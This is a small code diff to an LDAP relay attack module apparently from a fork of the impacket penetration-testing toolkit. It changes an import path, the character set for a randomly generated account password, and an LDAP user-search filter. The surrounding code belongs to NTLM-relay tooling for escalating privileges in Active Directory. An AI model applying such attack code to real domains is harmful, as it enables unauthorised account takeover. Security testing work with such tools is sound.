@@ -32,7 +32,7 @@ from Cryptodome.Hash import MD4
 
 from impacket import LOG
 from impacket.examples.ldap_shell import LdapShell
-from comm.ntlmrelayx.attacks import ProtocolAttack
+from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 from comm.ntlmrelayx.attacks.shadowCredential import ShadowCredentials
 from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
 from impacket.ldap import ldaptypes
@@ -129,7 +129,7 @@ class LDAPAttack(ProtocolAttack):
             return
 
         # Random password
-        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
 
         # Get the domain we are in
         domaindn = domainDumper.root
@@ -315,7 +315,7 @@ class LDAPAttack(ProtocolAttack):
         restoredata = {}
 
         # Query for the sid of our user
-        self.client.search(userDn, '(objectCategory=user)', attributes=['sAMAccountName', 'objectSid'])
+        self.client.search(userDn, '(objectClass=user)', attributes=['sAMAccountName', 'objectSid'])
         entry = self.client.entries[0]
         username = entry['sAMAccountName'].value
         usersid = entry['objectSid'].value
